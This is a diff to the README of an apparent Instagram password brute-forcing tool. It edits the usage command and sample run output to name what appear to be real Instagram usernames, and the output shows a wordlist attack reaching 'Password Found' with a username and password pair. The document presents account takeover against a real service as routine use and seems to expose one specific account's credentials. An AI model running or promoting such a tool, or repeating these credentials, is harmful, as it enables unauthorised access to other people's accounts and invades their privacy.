@@ -113,14 +113,14 @@ the system will automatically learn which proxies perform poorly and stop using 
 ### Usage
 
 ```
-python instagram.py -u <Ranyacrc_> -p <doido123>
+python instagram.py -u <sfdurans> -p <doido123>
 ```
 
 ### Run
 
 ```
 [-] Wordlist: passlist.txt
-[-] Username: 
+[-] Username: sfdurans
 [-] Password: doido123
 [-] Complete: 45.51%
 [-] Attempts: 228
@@ -132,7 +132,7 @@ python instagram.py -u <Ranyacrc_> -p <doido123>
 
 ```
 [-] Wordlist: passlist.txt
-[-] Username: 
+[-] Username: sfdurans
 [-] Password: doido123
 [-] Complete: 62.67%
 [-] Attempts: 314
@@ -140,6 +140,6 @@ python instagram.py -u <Ranyacrc_> -p <doido123>
 [-] Exists: True
 
 [!] Password Found
-[+] Username:
+[+] Username:sfdurans
 [+] Password: doido123
 ```
